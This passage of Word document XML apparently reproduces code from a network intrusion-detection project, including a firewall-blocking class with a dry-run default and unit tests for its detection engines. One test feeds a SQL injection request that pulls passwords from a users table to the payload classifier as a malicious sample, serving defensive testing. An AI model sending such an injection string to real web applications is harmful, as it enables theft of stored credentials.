    <w:p w14:paraId="504946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subprocess.run(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="262531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["iptables", "-I", "INPUT", "1", "-s", ip, "-j", "DROP"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF701E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check=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E10656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660F686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self.blocked_ips.add(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7825098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 blocked")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FEBCFF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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5496390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Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2216BC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self.failures += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D58B67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 block failed:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2F5CCBF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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1608DF27" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D65A5A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unblock_ip(self, ip):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F9099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ip not in self.blocked_ips:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="196D59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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="131FFB0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self.dry_run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CEDB67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self.blocked_ips.discard(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="567D26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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A2C9D5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3C9D45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subprocess.run(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788449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["iptables", "-D", "INPUT", "-s", ip, "-j", "DROP"],</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05F8964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check=True,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CA9BB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w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="067F36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self.blocked_ips.discard(ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5963FF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 unblocked", ip)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C3E476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True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C456A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Exception as e:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E181E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 unblock failed:", e)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E5796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False</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01264FDF" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="35D2CB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flush(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72CA04F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"""Remove every rule this process inserted.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B2C9DAB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09A976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Called on shutdown so a demonstration leaves the host's firewall in the</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="452EFEC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state it was found in, rather than requiring the operator to remember</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36F0806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which addresses were dropped.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="437A585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79BDD8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removed = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="418EF27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ip in list(self.blocked_ips):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23F898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self.unblock_ip(ip):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12F85A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removed += 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5CB4E3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removed:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227926E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 removed %d MANTIS firewall rule(s)" % removed)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CD71A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removed</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0328459C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B03197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active_rules(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00F488A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sorted(self.blocked_ips)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="402B55C5" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59863E02" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0E05B70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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C4C763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dry-run so running this file never touches the real firewall</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C6100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 = ActiveDefense(dry_run=True)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6059BED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print(d.block_ip("10.0.0.66"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFA4FB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print(d.block_ip("127.0.0.1"), "(whitelisted)")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36D1CA2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print("active:", d.active_rules())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2944C8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d.flush()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EC06547" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="45FA2318" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Automated Test Suite</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28212271"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src/tests/test_engines.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A3310E9" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>113 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="341C758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unit tests for the detection engines (no root, no sockets)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42D600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os</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26CFD96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sys</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ED39E4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unittest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="676BF889" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="342A8B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HERE = os.path.dirname(os.path.abspath(__file__))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F34489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SRC = os.path.dirname(HERE)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73D0A65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SRC not in sys.path:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="268A0B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sys.path.insert(0, SRC)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18F79508" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6D1D0DE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from engines import bloom, kmeans, knn, naive_bayes, z_score</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EAB2107" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="561EAF61" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="723B120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TestZScore(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2F5EB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test_constant_traffic_has_zero_stddev(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3750CF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 = z_score.MinimalistStats(window_size=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3243657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_ in range(10):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E9977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e.update(20)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="408C41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 s = e.calculate_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FC621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self.assertAlmostEqual(m, 20.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EF3C0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self.assertAlmostEqual(s, 0.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7823F9BE" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1730F6B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test_spike_triggers_high_z(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C74CA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 = z_score.MinimalistStats(window_size=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="377B280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_ in range(9):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ABC99A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e.update(10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="005F32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e.update(11)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F2AA12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 s = e.calculate_baseline()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01743D5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z = (500 - m) / s if s &gt; 0 else 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="636300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self.assertGreater(z, 3.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6824DD39" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6947CF30" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="02E44B7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TestKNN(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B2FE4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setUp(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4765AA6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self.e = knn.KNNMonitor(k=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="224625AB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="781FE4E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test_normal_browsing(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A9CDB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 _ = self.e.classify(2, 12)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E9E24F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self.assertEqual(v, "Normal")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43FC81ED" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="491140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test_aggressive_scan(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E3914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 _ = self.e.classify(400, 800)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76499F3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self.assertEqual(v, "Scan")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="016E114C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="769A3E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test_export_import_round_trip(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="164CDC0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snap = self.e.export_brain()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DA1347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fresh = knn.KNNMonitor(k=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C655BE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fresh.training_data = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6783244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fresh.import_brain(snap)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D147C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self.assertEqual(len(fresh.training_data),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05E910D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len(self.e.training_data))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5938C2F4" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="719BEE38" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="060EC3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TestNaiveBayes(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F7086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setUp(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1ADA845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self.e = naive_bayes.PayloadMonitor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C14B23C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5106887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test_normal_http_is_safe(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02ADB01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 _, _ = self.e.classify(b"GET /index.html HTTP/1.1")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C4A50E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self.assertEqual(v, "Safe")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A0E9E3D" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0DD95F5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test_sqli_is_malicious(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="672BEDB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 conf, words = self.e.classify(</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B4A6BA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b"GET /?id=1 UNION SELECT password FROM users --")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1110C30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self.assertEqual(v, "Malicious")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B16C9D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self.assertGreaterEqual(conf, 0.80)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="444954C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self.assertIn("UNION", words)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C4742AB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="64D580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test_admin_alone_is_never_malicious(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DA300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Simulate an overconfident imported model like the one that caused</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2168A33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duplicate ADMIN alerts in the live dashboard.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4649C07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self.e.prior_malicious = 0.5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="166915A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self.e.prior_safe = 0.5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5871917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self.e.likelihoods = {"ADMIN": (0.99, 0.01)}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17E7947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 confidence, words = self.e.classify(b"GET /admin HTTP/1.1")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A36B50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self.assertGreater(confidence, 0.80)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0FCC93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self.assertEqual(words, ["ADMIN"])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3637354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self.assertEqual(verdict, "Safe")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F0408BC" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="58CFFE9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test_export_import_round_trip(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E67EA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snap = self.e.export_brain()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33893D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fresh = naive_bayes.PayloadMonitor()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32FC90C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fresh.import_brain(snap)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1E4B33A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self.assertEqual(fresh.prior_malicious, self.e.prior_malicious)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4609763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self.assertEqual(set(fresh.likelihoods), set(self.e.likelihoods))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74081E8C" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7688DE83" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7BCD38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TestKMeans(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B0EE2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test_returns_valid_cluster(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5504C3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 = kmeans.KMeansMonitor(k=3, learning_rate=0.05)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32DA7C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self.assertIn(e.classify(10, 2), (0, 1, 2))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02DABF77" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1CEFE80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test_centroid_moves_after_observation(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AA576C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 = kmeans.KMeansMonitor(k=3, learning_rate=0.5)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78CA115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before = list(e.centroids[0])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B085C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e.classify(20, 4)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AD153F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self.assertNotEqual(before, e.centroids[0])</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B8F3739" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="60464F49" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="045C8B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TestBloom(unittest.TestCase):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D642B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test_added_item_found(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36E67D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bf = bloom.BloomFilter(size=200, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="436314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bf.add("10.0.0.5")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B2962C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self.assertTrue(bf.check("10.0.0.5"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DBFA54B" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0C34F3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test_unknown_item_not_found(self):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="667908B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bf = bloom.BloomFilter(size=200, hash_count=3)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C500B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bf.add("10.0.0.5")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35E0AD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self.assertFalse(bf.check("8.8.8.8"))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="075CC5AA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0D17C5BB" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6409488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__name__ == "__main__":</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5330930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unittest.main(verbosity=2)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0986270D"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src/tests/test_modules.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A94E294" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:rFonts w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00EA1A82">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>476 lines</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CC545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#!/usr/bin/env python3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76FC6BB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"""Unit tests for the supporting modules and the algorithmic corrections.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4CBC9861" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7A2E9F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Covers the parts of the system that are not detection engines themselves but</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="69B817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that the requirements depend on:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56708CBA" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="36D3AFB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utils.privacy   NFR-3 / DPA 2018 data minimisation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7208A16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utils.pcap      libpcap encoding and decoding</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="502590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utils.mitre     ATT&amp;CK mapping and risk scoring</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C3625D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utils.config    configuration precedence, opt-in defaults</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5455D2F0" w14:textId="77777777" w:rsidR="00A819AD" w:rsidRPr="00EA1A82" w:rsidRDefault="00A819AD">
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B8A1F5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plus regression tests for the three algorithmic defects found while building</w:t>
